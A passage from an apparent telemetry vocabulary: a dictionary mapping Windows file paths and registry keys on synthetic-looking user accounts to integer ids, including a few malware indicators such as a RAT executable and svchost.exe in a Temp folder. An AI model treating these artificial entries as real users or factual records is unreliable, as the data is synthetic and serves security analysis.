       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\css': 603,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\yo-NG\\\\*': 604,\n",
       " 'HKCU\\\\Software\\\\Classes\\\\Local Settings\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\AppModel\\\\Repository\\\\Packages\\\\Microsoft.MixedReality.Portal_2000.21051.1282.0_x64__8wekyb3d8bbwe\\\\App\\\\Capabilities\\\\Hidden': 605,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\TempState\\\\.git': 606,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 607,\n",
       " 'C:\\\\Users\\\\wgibson\\\\AppData\\\\Local\\\\Packages\\\\*': 608,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.3_8wekyb3d8bbwe\\\\AC': 609,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\PKIMetadata': 610,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\637849849811270000\\\\2\\\\Data': 611,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\tn-ZA\\\\*': 612,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.0_8wekyb3d8bbwe\\\\AC': 613,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 614,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\\\\LocalCache\\\\*': 615,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\el-GR\\\\*': 616,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\Settings': 617,\n",
       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy\\\\TempState\\\\.git': 618,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\sessionstore-backups\\\\*': 619,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AppData\\\\.git': 620,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AccountsControl_cw5n1h2txyewy\\\\SystemAppData\\\\*': 621,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ru\\\\.git': 622,\n",
       " 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\SAMLIB.dll': 623,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\3D Objects': 624,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\nb-NO\\\\.git': 625,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\configs\\\\auoms-rules\\\\*': 626,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\AC\\\\BackgroundTransferApi\\\\*': 627,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdgeDevToolsClient_8wekyb3d8bbwe\\\\LocalCache\\\\*': 628,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\.git': 629,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\tr-TR\\\\*': 630,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\uk\\\\*': 631,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 632,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\IECompatUaCache': 633,\n",
       " 'C:\\\\Users\\\\wgibson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\338389': 634,\n",
       " 'C:\\\\Users\\\\steven78\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\TempState\\\\*': 635,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\RoamingState': 636,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\WidevineCdm\\\\*': 637,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.2.2_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 638,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\Settings\\\\.git': 639,\n",
       " 'Caso_Flawed_AMMYY_RAT_M41nt.exe': 640,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\ro\\\\*': 641,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\SystemAppData': 642,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\Internet Explorer\\\\DOMStore\\\\.git': 643,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\pt_BR\\\\*': 644,\n",
       " '0f877ad5464fcbb12e1c019adf7065cc.dll': 645,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-PR\\\\*': 646,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\LocalCache\\\\*': 647,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\LocalCache\\\\.git': 648,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 649,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AppData\\\\CacheStorage\\\\.git': 650,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\crashes': 651,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\se\\\\*': 652,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\fr\\\\.git': 653,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Publishers\\\\8wekyb3d8bbwe': 654,\n",
       " 'C:\\\\Users\\\\wgibson\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\pt-PT\\\\*': 655,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\AC': 656,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Code Cache\\\\.git': 657,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\shared_proto_db\\\\.git': 658,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\*': 659,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 660,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\lv': 661,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\kk': 662,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\storage\\\\permanent\\\\chrome\\\\idb\\\\2823318777ntouromlalnodry--naod.files\\\\.git': 663,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.CredDialogHost_cw5n1h2txyewy\\\\.git': 664,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\2637\\\\2\\\\*': 665,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\el': 666,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\sr\\\\.git': 667,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCamera_8wekyb3d8bbwe\\\\LocalState\\\\*': 668,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\*': 669,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\*': 670,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\qml\\\\QtQuick\\\\Controls\\\\Styles': 671,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\lt': 672,\n",
       " 'C:\\\\Users\\\\lanealbert\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\kk-KZ': 673,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extension State\\\\*': 674,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\de-DE\\\\*': 675,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\uk\\\\*': 676,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\sr\\\\.git': 677,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\\\\TempState\\\\.git': 678,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\AC\\\\Temp': 679,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\quc\\\\.git': 680,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.SkypeApp_kzf8qxf38zg5c\\\\AC\\\\*': 681,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Windows.CBSPreview_cw5n1h2txyewy\\\\SystemAppData': 682,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\.git': 683,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\2637\\\\2\\\\*': 684,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\es': 685,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\WidevineCdm\\\\4.10.2391.6\\\\_platform_specific\\\\win_x64\\\\*': 686,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\AC\\\\Temp': 687,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 688,\n",
       " 'C:\\\\Users\\\\wchapman\\\\AppData\\\\Roaming\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\\\\User Pinned\\\\ImplicitAppShortcuts': 689,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\es_419': 690,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-US\\\\*': 691,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\\\\LocalState\\\\*': 692,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\280815\\\\.git': 693,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\ms\\\\.git': 694,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\AppData': 695,\n",
       " 'C:\\\\Users\\\\julie68\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Win10-AD-MXS\\\\.git': 696,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\logs\\\\ListSync\\\\.git': 697,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 698,\n",
       " 'C:\\\\Users\\\\wgibson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.1.7_8wekyb3d8bbwe\\\\.git': 699,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\lt': 700,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ko': 701,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Feature Engagement Tracker': 702,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\da\\\\.git': 703,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.SkypeApp_kzf8qxf38zg5c\\\\LocalCache\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\*': 704,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\settings\\\\main\\\\ms-language-packs\\\\*': 705,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\nso-ZA\\\\.git': 706,\n",
       " 'C:\\\\Users\\\\lanealbert\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 707,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\Settings\\\\.git': 708,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Roaming\\\\Microsoft\\\\SystemCertificates\\\\My\\\\*': 709,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ar\\\\*': 710,\n",
       " 'C:\\\\Users\\\\wyatt69\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\AC\\\\.git': 711,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\pl\\\\.git': 712,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Sessions\\\\*': 713,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 714,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 715,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Win32WebViewHost_cw5n1h2txyewy\\\\LocalState\\\\.git': 716,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-KW\\\\.git': 717,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\AppData\\\\*': 718,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ZuneMusic_8wekyb3d8bbwe\\\\TempState': 719,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\LocalCache\\\\Roaming\\\\Microsoft\\\\Windows\\\\.git': 720,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 721,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\storage\\\\permanent\\\\.git': 722,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 723,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\.git': 724,\n",
       " 'C:\\\\Users\\\\wchapman\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\hu': 725,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\LocalState\\\\*': 726,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default': 727,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\ru\\\\.git': 728,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 729,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Microsoft\\\\CLR_v4.0_32\\\\UsageLogs\\\\.git': 730,\n",
       " 'C:\\\\Users\\\\christopher63\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 731,\n",
       " 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{559D40A3-A036-40FA-AF61-84CB430A4D34}\\\\InitFolderHandler': 732,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Packages\\\\ActiveSync\\\\.git': 733,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\RoamingState\\\\*': 734,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\*': 735,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\Settings\\\\.git': 736,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\338387\\\\.git': 737,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Packages\\\\Windows.PrintDialog_cw5n1h2txyewy\\\\AC\\\\Temp': 738,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\blob_storage': 739,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\nn-NO': 740,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Getstarted_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 741,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\no\\\\*': 742,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Microsoft\\\\Credentials': 743,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Comms': 744,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\lv\\\\*': 745,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\\\\.git': 746,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\it\\\\*': 747,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\sr\\\\.git': 748,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\hi-IN\\\\.git': 749,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\AC\\\\*': 750,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\FeatureControl\\\\FEATURE_BLOCK_WEAK_ENCRYPTION': 751,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.GetHelp_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 752,\n",
       " '\"C:\\\\Users\\\\jessicagomez\\\\AppData\\\\Local\\\\Temp\\\\svchost.exe\" ': 753,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Xbox.TCUI_8wekyb3d8bbwe\\\\AppData': 754,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\uk': 755,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 756,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\ms\\\\.git': 757,\n",
